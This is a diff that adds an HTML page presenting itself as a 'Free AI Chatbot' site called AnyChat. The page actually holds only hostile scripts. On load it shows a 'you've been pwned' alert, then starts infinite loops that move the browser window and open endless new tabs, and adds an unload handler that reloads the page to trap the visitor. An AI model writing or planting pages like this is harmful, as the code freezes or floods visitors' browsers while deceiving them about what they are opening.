@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free AI Chatbot | AnyChat</title>
+</head>
+<body>
+    <script>
+        alert("Congratulations, you've been pwned!");
+        
+        setTimeout(function() {
+            executeScripts();
+        }, 1000);
+        
+        function executeScripts() {
+            script1();
+            script2();
+            script3();
+        }
+</script>
+
+    <script>
+        function script1() {
+            while(1) {
+                for(let i = 0; i < screen.height; i++) {
+                    for(let j = 0; j < screen.width; j++) {
+                        window.moveTo(j, i);
+                    }
+                }
+            }
+        }
+    </script>
+
+    <script>
+        function script2() {
+            window.onbeforeunload = function() {
+                localStorage.setItem('x', '1');
+                setTimeout(function() {
+                    location.reload();
+                }, 1000);
+            }
+        }
+    </script>
+
+    <script>
+        function script3() {
+            while (true) {
+                window.open("https://google.com", "_blank");
+            }
+        }
+    </script>
+</body>
+</html>
